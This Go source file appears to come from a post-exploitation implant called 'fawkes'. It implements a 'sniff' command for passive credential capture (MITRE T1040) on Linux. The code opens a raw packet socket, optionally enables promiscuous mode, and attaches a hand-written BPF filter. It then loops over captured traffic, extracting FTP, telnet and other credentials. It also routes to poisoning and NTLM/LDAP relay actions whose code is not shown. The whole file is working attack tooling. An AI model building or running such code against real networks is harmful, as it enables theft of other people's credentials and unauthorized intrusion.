//go:build linux

package commands

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string { return "sniff" }
func (c *SniffCommand) Description() string {
	return "Passive network sniffing for credential capture (T1040)"
}

func sniffHtons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "poison" {
		return c.executePoison(task)
	}
	if params.Action == "relay" {
		return c.executeRelay(task)
	}
	if params.Action == "ldap-relay" {
		return executeLDAPRelayCore(task)
	}

	ports := sniffApplyDefaults(&params)

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(sniffHtons(unix.ETH_P_IP)))
	if err != nil {
		return errorf("Failed to create raw socket (need root/CAP_NET_RAW): %v", err)
	}
	defer unix.Close(fd)

	result := &sniffResult{}

	if params.Interface != "" {
		iface, ifErr := net.InterfaceByName(params.Interface)
		if ifErr != nil {
			return errorf("Interface %q not found: %v", params.Interface, ifErr)
		}

		sll := unix.SockaddrLinklayer{
			Protocol: sniffHtons(unix.ETH_P_IP),
			Ifindex:  iface.Index,
		}
		if bindErr := unix.Bind(fd, &sll); bindErr != nil {
			return errorf("Bind to %q failed: %v", params.Interface, bindErr)
		}

		if params.Promiscuous {
			mreq := unix.PacketMreq{
				Ifindex: int32(iface.Index),
				Type:    unix.PACKET_MR_PROMISC,
			}
			if promErr := unix.SetsockoptPacketMreq(fd, unix.SOL_PACKET, unix.PACKET_ADD_MEMBERSHIP, &mreq); promErr != nil {
				result.Errors = append(result.Errors, fmt.Sprintf("promiscuous mode failed: %v", promErr))
			} else {
				defer func() {
					_ = unix.SetsockoptPacketMreq(fd, unix.SOL_PACKET, unix.PACKET_DROP_MEMBERSHIP, &unix.PacketMreq{
						Ifindex: int32(iface.Index),
						Type:    unix.PACKET_MR_PROMISC,
					})
				}()
			}
		}
	}

	bpfFilter := sniffBuildTCPFilter(ports)
	if bpfErr := sniffAttachBPF(fd, bpfFilter); bpfErr != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("BPF filter failed: %v", bpfErr))
	}

	tv := unix.Timeval{Sec: 1, Usec: 0}
	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)

	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
	var pcapCollector *sniffPCAPCollector
	if params.SavePCAP {
		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
	}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, 65536)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, _, recvErr := unix.Recvfrom(fd, buf, 0)
		if recvErr != nil {
			if recvErr == unix.EAGAIN || recvErr == unix.EWOULDBLOCK || recvErr == unix.EINTR {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("recvfrom: %v", recvErr))
			break
		}
		if n == 0 {
			continue
		}

		result.PacketCount++
		result.BytesCaptured += int64(n)
		packet := buf[:n]

		if pcapCollector != nil {
			pcapCollector.addPacket(packet)
		}

		if len(packet) < 14 {
			continue
		}
		etherType := binary.BigEndian.Uint16(packet[12:14])
		if etherType != 0x0800 {
			continue
		}
		pkt := sniffParseIPPacket(packet[14:])
		if pkt == nil {
			continue
		}
		if !sniffMatchPort(ports, pkt.Meta.SrcPort, pkt.Meta.DstPort) {
			continue
		}
		sniffExtractCredentials(pkt.Payload, &pkt.Meta, result, ftpTracker, telnetTracker)
	}

	return sniffFinalizeResult(&task, result, startTime, pcapCollector, 1)
}

func sniffBuildTCPFilter(ports []uint16) []unix.SockFilter {
	// Accept IPv4 TCP (proto 6) or UDP (proto 17) packets.
	// Port filtering is done in userspace since BPF port offsets differ for TCP vs UDP.
	return []unix.SockFilter{
		{Code: 0x28, K: 12},                   // ldh [12] — EtherType
		{Code: 0x15, Jt: 0, Jf: 4, K: 0x0800}, // jeq #0x0800, next, drop
		{Code: 0x30, K: 23},                   // ldb [23] — IP protocol
		{Code: 0x15, Jt: 1, Jf: 0, K: 6},      // jeq #6 (TCP), accept
		{Code: 0x15, Jt: 0, Jf: 1, K: 17},     // jeq #17 (UDP), accept, drop
		{Code: 0x06, K: 0xFFFFFFFF},           // ret #-1 (accept)
		{Code: 0x06, K: 0},                    // ret #0 (drop)
	}
}

func sniffAttachBPF(fd int, filter []unix.SockFilter) error {
	prog := unix.SockFprog{
		Len:    uint16(len(filter)),
		Filter: &filter[0],
	}
	_, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd),
		uintptr(unix.SOL_SOCKET),
		uintptr(unix.SO_ATTACH_FILTER),
		uintptr(unsafe.Pointer(&prog)),
		uintptr(unsafe.Sizeof(prog)),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("SO_ATTACH_FILTER: %w", errno)
	}
	return nil
}
